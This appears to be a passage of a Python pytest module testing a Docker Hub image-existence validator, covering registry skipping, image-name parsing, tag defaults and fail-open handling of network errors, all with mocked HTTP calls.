# Docker Hub image validation tests
# ---------------------------------------------------------------------------


def _mock_response(status_code: int) -> httpx.Response:
    """Create a mock httpx.Response with the given status code."""
    return httpx.Response(status_code=status_code, request=httpx.Request("GET", "https://hub.docker.com"))


class TestValidateDockerImage:
    @pytest.mark.asyncio
    async def test_prebuilt_alias_skipped(self):
        """Prebuilt aliases make no HTTP call."""
        with patch("src.agent.dockerfile.httpx.AsyncClient") as mock_cls:
            await validate_docker_image("ouro-python")
            mock_cls.assert_not_called()

    @pytest.mark.asyncio
    async def test_digest_reference_skipped(self):
        """Digest references make no HTTP call."""
        digest = "a" * 64
        with patch("src.agent.dockerfile.httpx.AsyncClient") as mock_cls:
            await validate_docker_image(f"python@sha256:{digest}")
            mock_cls.assert_not_called()

    @pytest.mark.asyncio
    async def test_non_dockerhub_registry_skipped(self):
        """Non-Docker-Hub registries make no HTTP call."""
        with patch("src.agent.dockerfile.httpx.AsyncClient") as mock_cls:
            await validate_docker_image("ghcr.io/org/repo:v1")
            mock_cls.assert_not_called()

    @pytest.mark.asyncio
    async def test_quay_registry_skipped(self):
        with patch("src.agent.dockerfile.httpx.AsyncClient") as mock_cls:
            await validate_docker_image("quay.io/some/image:latest")
            mock_cls.assert_not_called()

    @pytest.mark.asyncio
    async def test_docker_io_prefix_normalized(self):
        """docker.io/ prefix is stripped and treated as Docker Hub."""
        mock_client = AsyncMock()
        mock_client.__aenter__ = AsyncMock(return_value=mock_client)
        mock_client.__aexit__ = AsyncMock(return_value=False)
        mock_client.get = AsyncMock(return_value=_mock_response(200))

        with patch("src.agent.dockerfile.httpx.AsyncClient", return_value=mock_client):
            await validate_docker_image("docker.io/library/python:3.12")
            mock_client.get.assert_called_once_with(
                "https://hub.docker.com/v2/namespaces/library/repositories/python/tags/3.12"
            )

    @pytest.mark.asyncio
    async def test_valid_image_passes(self):
        """200 response means image exists — no exception."""
        mock_client = AsyncMock()
        mock_client.__aenter__ = AsyncMock(return_value=mock_client)
        mock_client.__aexit__ = AsyncMock(return_value=False)
        mock_client.get = AsyncMock(return_value=_mock_response(200))

        with patch("src.agent.dockerfile.httpx.AsyncClient", return_value=mock_client):
            await validate_docker_image("python:3.12-slim")

    @pytest.mark.asyncio
    async def test_nonexistent_image_raises(self):
        """404 response raises ValueError with image name."""
        mock_client = AsyncMock()
        mock_client.__aenter__ = AsyncMock(return_value=mock_client)
        mock_client.__aexit__ = AsyncMock(return_value=False)
        mock_client.get = AsyncMock(return_value=_mock_response(404))

        with patch("src.agent.dockerfile.httpx.AsyncClient", return_value=mock_client):
            with pytest.raises(ValueError, match="pyhton:3.12.*not found"):
                await validate_docker_image("pyhton:3.12")

    @pytest.mark.asyncio
    async def test_no_tag_defaults_to_latest(self):
        """Image without tag queries for 'latest'."""
        mock_client = AsyncMock()
        mock_client.__aenter__ = AsyncMock(return_value=mock_client)
        mock_client.__aexit__ = AsyncMock(return_value=False)
        mock_client.get = AsyncMock(return_value=_mock_response(200))

        with patch("src.agent.dockerfile.httpx.AsyncClient", return_value=mock_client):
            await validate_docker_image("python")
            mock_client.get.assert_called_once_with(
                "https://hub.docker.com/v2/namespaces/library/repositories/python/tags/latest"
            )

    @pytest.mark.asyncio
    async def test_namespaced_image_parsing(self):
        """myorg/repo:v1 queries correct namespace/repo/tag."""
        mock_client = AsyncMock()
        mock_client.__aenter__ = AsyncMock(return_value=mock_client)
        mock_client.__aexit__ = AsyncMock(return_value=False)
        mock_client.get = AsyncMock(return_value=_mock_response(200))

        with patch("src.agent.dockerfile.httpx.AsyncClient", return_value=mock_client):
            await validate_docker_image("myorg/myrepo:v1")
            mock_client.get.assert_called_once_with(
                "https://hub.docker.com/v2/namespaces/myorg/repositories/myrepo/tags/v1"
            )

    @pytest.mark.asyncio
    async def test_timeout_fails_open(self):
        """Timeout does not raise — fails open."""
        mock_client = AsyncMock()
        mock_client.__aenter__ = AsyncMock(return_value=mock_client)
        mock_client.__aexit__ = AsyncMock(return_value=False)
        mock_client.get = AsyncMock(side_effect=httpx.ConnectTimeout("timeout"))

        with patch("src.agent.dockerfile.httpx.AsyncClient", return_value=mock_client):
            await validate_docker_image("python:3.12")  # should not raise

    @pytest.mark.asyncio
    async def test_5xx_fails_open(self):
        """500 response does not raise — fails open."""
        mock_client = AsyncMock()
        mock_client.__aenter__ = AsyncMock(return_value=mock_client)
        mock_client.__aexit__ = AsyncMock(return_value=False)
        mock_client.get = AsyncMock(return_value=_mock_response(500))

        with patch("src.agent.dockerfile.httpx.AsyncClient", return_value=mock_client):
            await validate_docker_image("python:3.12")  # should not raise

    @pytest.mark.asyncio
    async def test_429_rate_limit_fails_open(self):
        """429 response does not raise — fails open."""
        mock_client = AsyncMock()
        mock_client.__aenter__ = AsyncMock(return_value=mock_client)
        mock_client.__aexit__ = AsyncMock(return_value=False)
        mock_client.get = AsyncMock(return_value=_mock_response(429))

        with patch("src.agent.dockerfile.httpx.AsyncClient", return_value=mock_client):
            await validate_docker_image("python:3.12")  # should not raise

    @pytest.mark.asyncio
    async def test_connect_error_fails_open(self):
        """Network error does not raise — fails open."""
        mock_client = AsyncMock()
        mock_client.__aenter__ = AsyncMock(return_value=mock_client)
        mock_client.__aexit__ = AsyncMock(return_value=False)
        mock_client.get = AsyncMock(side_effect=httpx.ConnectError("connection refused"))

        with patch("src.agent.dockerfile.httpx.AsyncClient", return_value=mock_client):
            await validate_docker_image("python:3.12")  # should not raise

    @pytest.mark.asyncio
    async def test_index_docker_io_prefix_normalized(self):
        """index.docker.io/ prefix is stripped and treated as Docker Hub."""
        mock_client = AsyncMock()
        mock_client.__aenter__ = AsyncMock(return_value=mock_client)
        mock_client.__aexit__ = AsyncMock(return_value=False)
        mock_client.get = AsyncMock(return_value=_mock_response(200))

        with patch("src.agent.dockerfile.httpx.AsyncClient", return_value=mock_client):
            await validate_docker_image("index.docker.io/library/nginx:latest")
            mock_client.get.assert_called_once_with(
                "https://hub.docker.com/v2/namespaces/library/repositories/nginx/tags/latest"
            )
